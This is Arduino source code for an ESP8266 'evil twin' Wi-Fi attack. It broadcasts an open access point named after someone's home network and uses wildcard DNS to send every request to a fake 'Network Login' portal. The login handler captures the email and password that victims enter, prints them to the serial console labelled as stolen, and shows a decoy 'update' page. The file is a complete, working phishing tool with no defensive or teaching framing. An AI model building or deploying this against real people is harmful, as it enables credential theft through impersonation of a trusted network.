#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// --- CONFIGURATION ---
const char* ssid = "Kunal_Home_WiFi_5G";
const byte DNS_PORT = 53;
IPAddress apIP(172, 0, 0, 1);
DNSServer dnsServer;
ESP8266WebServer server(80);

// --- CYBERPUNK PORTAL HTML ---
String getHTML() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; }";
  html += ".box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: inline-block; width: 100%; max-width: 300px; }";
  html += "input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }";
  html += "button { width: 95%; padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }";
  html += "</style></head><body>";
  html += "<div class='box'><h3>Network Login</h3>";
  html += "<p>Please sign in to connect to the network.</p>";
  html += "<form action='/login' method='POST'>";
  html += "<input type='email' name='email' placeholder='Email address' required><br>";
  html += "<input type='password' name='password' placeholder='Password' required><br>";
  html += "<button type='submit'>Connect</button>";
  html += "</form></div></body></html>";
  return html;
}

void handleRoot() { server.send(200, "text/html", getHTML()); }

void handleLogin() {
  String email = server.arg("email");
  String pass = server.arg("password");
  Serial.println("\n--- CRITICAL: CREDENTIAL CAPTURED ---");
  Serial.println("STOLEN Email: " + email);
  Serial.println("STOLEN PASSWORD: " + pass);
  server.send(200, "text/html", "<html><body style='background-color:#0d0f12;color:#22d3ee;text-align:center;'><h1>Update 14% Complete...</h1></body></html>");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid);
  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.onNotFound(handleRoot);
  server.begin();
  Serial.println("Evil Twin Network '"+String(ssid)+"' is LIVE 💀");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}